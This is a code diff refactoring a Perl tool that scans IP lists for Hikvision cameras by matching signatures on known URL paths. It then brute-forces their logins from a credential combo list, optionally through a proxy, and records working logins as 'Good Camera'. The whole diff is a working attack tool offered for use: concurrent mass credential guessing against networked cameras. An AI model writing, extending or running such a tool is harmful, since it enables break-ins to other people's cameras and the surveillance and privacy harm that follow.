@@ -8,10 +8,11 @@ use List::Util qw/any uniq/;
 use File::Slurp qw/read_file/;
 use feature qw/say switch unicode_strings/;
 
-use URI;
 use Coro;
-use Coro::Timer;
 use Coro::Select;
+use Coro::Channel;
+
+use URI;
 use LWP::UserAgent;
 use LWP::Protocol::socks;
 
@@ -169,68 +170,65 @@ say 'IP list size: ' . scalar(@ipList);
 say 'The total number of combinations for testing: ' . scalar(@ipList) * scalar(@comboList);
 
 # Создаём прогрессбар
-my $total_processed_combinations = 0;
 my $progress = Term::ProgressBar->new({
     count => scalar(@ipList) * scalar(@comboList),
     name  => 'Bruteforcing',
     ETA   => 'linear'
 });
-$progress->update($total_processed_combinations);
+$progress->update(0);
 
-# Создаем массив корутин
+# Функция брутфорса логинов и паролей
+sub bruteforce {
+    my ($ip_address, $ua, $progress_bar, $combo_list) = @_;
+
+    my $tested_combos = 0;
+    my $password_found = 0;
+    for my $combo (@$combo_list) {
+        my ($login, $password) = split /:/, $combo;
+
+        if (login($ip_address, $login, $password, $ua)) {
+            $progress_bar->message('[Good Camera] ' . $login . ';' . $password . '@' . $ip_address);
+            save_good($ip_address, $login, $password);
+
+            $progress_bar->update($progress_bar->last_update + ($tested_combos - $progress_bar->last_update));
+            $password_found = 1;
+            last;
+        }
+        else {
+            $tested_combos++;
+            $progress_bar->update($progress_bar->last_update + 1);
+        }
+    }
+
+    $progress_bar->message('[Bad Camera] ' . $ip_address)
+        unless $password_found;
+
+    return $password_found;
+}
+
+my $channel = Coro::Channel->new();
+$channel->put($_) for @ipList;
+$channel->shutdown;
+
+# Создаем корутины
 my @coroutines;
 for (1 .. $args->{threads}) {
     push @coroutines, async {
-        my $ua = LWP::UserAgent->new;
-        $ua->timeout($args->{timeout});
-        $ua->proxy([ qw(http https) ] => $args->{proxy})
-            if $args->{proxy};
+        my $ua = LWP::UserAgent->new(
+            timeout => $args->{timeout},
+            proxy   => $args->{proxy} ? [ [ qw(http https) ] => $args->{proxy} ] : undef,
+        );
 
-        # Обработка каждого IP адреса из списка
-        while (my $ip_address = shift @ipList) {
-            # chomp($ip_address);
-            $ip_address =~ s/\R//g; # быстрее чем chomp
-
-            unless ($ip_address && $ip_address ne '') {
-                $total_processed_combinations += scalar(@comboList);
-                $progress->update($total_processed_combinations);
-                next;
-            }
+        while (my $ip_address = $channel->get) {
 
             # Проверяем, является ли устройство камерой
             if (is_camera($ip_address, $ua, $progress)) {
-                my $is_password_found = 0;
                 $progress->message('[Camera] ' . $ip_address);
-
-                # Брутфорс логинов и паролей
-                my $local_processed_combinations = 0;
-                for my $combo (@comboList) {
-                    my ($login, $password) = split /:/, $combo;
-
-                    if (login($ip_address, $login, $password, $ua)) {
-                        $progress->message('[Good Camera] ' . $login . ';' . $password . '@' . $ip_address);
-                        save_good($ip_address, $login, $password);
-
-                        $total_processed_combinations += $local_processed_combinations - scalar(@comboList);
-                        $progress->update($total_processed_combinations);
-
-                        $is_password_found = 1;
-                        last;
-                    }
-                    else {
-                        $local_processed_combinations++;
-                        $total_processed_combinations++;
-                        $progress->update($total_processed_combinations);
-                    }
-                }
-
-                $progress->message('[Bad Camera] ' . $ip_address)
-                    unless $is_password_found;
+                bruteforce($ip_address, $ua, $progress, \@comboList);
             }
             else {
                 $progress->message('[Not Camera] ' . $ip_address);
-                $total_processed_combinations += scalar(@comboList);
-                $progress->update($total_processed_combinations);
+                $progress->update($progress->last_update + scalar(@comboList));
             }
         }
     };
@@ -239,75 +237,63 @@ for (1 .. $args->{threads}) {
 # Дожидаемся завершения выполнения всех корутин
 $_->join for @coroutines;
 
-# Проверяет камера ли это опираясь на набор сигнатур
+# Обрабатываем ответ сервера пытаясь найти совпадение с сигнатурой
+sub process_response {
+    my ($resp, $progress_bar, $pattern, $dbg) = @_;
+    my ($pattern_str) = Data::Dumper::Dumper($pattern) =~ m!^\$VAR1\s+=\s+(.+);\s*$!;
+
+    my $status_line = $resp->status_line();
+    my $no_connection = any {$status_line =~ $_} qr/^Can't connect/, qr/Connection refused/, qr/read timeout/;
+
+    if ($dbg) {
+        my $msg_type = $no_connection ? "No Connection" : "Error";
+        my $msg = "[R][!] $msg_type: $status_line";
+        $progress_bar->message($msg);
+    }
+
+    my $matched = (($resp->as_string() || '') =~ $pattern);
+    my $msg_type = $matched ? "[+]" : "[-]";
+    my $msg = "[S]$msg_type Signature [$pattern_str] " . ($matched ? "matched" : "not match");
+    $progress_bar->message($msg);
+
+    return $matched ? 1 : 0;
+}
+
+# Проверяем является ли девайс камерой
 sub is_camera {
     my ($ip, $ua, $progress_bar, $patterns, $retries) = @_;
-    return 0 unless (defined $ip and defined $ua);
+    return 0 unless ($ip && $ua);
 
-    my $dbg = $args->{debug};
-
-    $patterns = {
+    $retries //= 2;
+    $patterns //= { # Использование короткой записи инициализации хэша
         'http://%s/doc/page/login.asp'                 => qr#Hikvision#i,
         'http://%s/doc/i18n/en/Common.json'            => qr#Hikvision#i,
         'http://%s/doc/i18n/en/Config.json'            => qr#Hikvision#i,
         'http://%s/SDK/activateStatus'                 => qr#Hikvision#i,
         'http://%s/ISAPI/Security/extern/capabilities' => qr#Hikvision#i,
         'http://%s/SDK/language'                       => qr#hikvision#i
-    } unless (defined $patterns);
+    };
 
-    $retries //= 2;
-
-    my $success = undef;
-    foreach my $url_mask (keys %$patterns) {
+    my $success;
+    for my $url_mask (keys %$patterns) {
         my $pattern = $patterns->{$url_mask};
         my $url = sprintf($url_mask, $ip);
 
-        for (my $i = 0; $i < $retries; $i++) {
+        for my $i (0 .. $retries - 1) {
             my $resp = $ua->get($url);
 
-            if ($i == 0) {
-                $progress_bar->message("[R][i] Request to url: $url [" . $resp->status_line() . "]")
-                    if $dbg;
-            }
-            else {
-                $progress_bar->message("[R][i] Retry[" . ($i + 1) . "] Request to url: $url [" . $resp->status_line() . "]")
-                    if $dbg;
-            }
+            my $retry_msg = ($i == 0) ? "" : "[Retry " . ($i + 1) . "] ";
+            my $request_msg = sprintf(
+                "[R][i] %sRequest to url: %s [%s]",
+                $retry_msg, $url, $resp->status_line()
+            );
+            $progress_bar->message($request_msg)
+                if ($args->{debug});
 
-            if ($resp->is_success) {
-                my ($pattern_str) = Data::Dumper::Dumper($pattern) =~ m!^\$VAR1\s+=\s+(.+);\s*$!
-                    if $dbg;
-
-                if (($resp->as_string() || '') =~ $pattern) {
-                    $progress_bar->message("[S][+] Signature [ $pattern_str ] matched on url: $url")
-                        if $dbg;
-                }
-                else {
-                    $progress_bar->message("[S][-] Signature [ $pattern_str ] not match on url: $url")
-                        if $dbg;
-                }
-
-                $success = 1;
-                last; # Выходим из цикла retry поскольку запрос удалось выполнить
-            }
-            else {
-                my $status_line = $resp->status_line();
-                # Обработка тех самых странных ошибок которые говорят о том что удалённая железка офлайн
-                if ($status_line =~ /^Can't connect/ || $status_line =~ /Connection refused/ || $status_line =~ /read timeout/) {
-                    $progress_bar->message("[R][!] No Connection while trying to access $url: $status_line")
-                        if $dbg;
-                    $success = 0;
-                }
-                else {
-                    $progress_bar->message("[R][!] Error while trying to access $url: $status_line")
-                        if $dbg;
-                    last;
-                }
-            }
+            $success = process_response($resp, $progress_bar, $pattern, $args->{debug});
+            last if $success == 0;
+            return 1 if $success;
         }
-
-        last if defined $success and $success == 0;     # если вышли из retry и последний запрос не увенчался успехом
-        return 1 if defined $success and $success == 1; # если вышли из retry найдя сигнатуру
     }
 
     return 0;
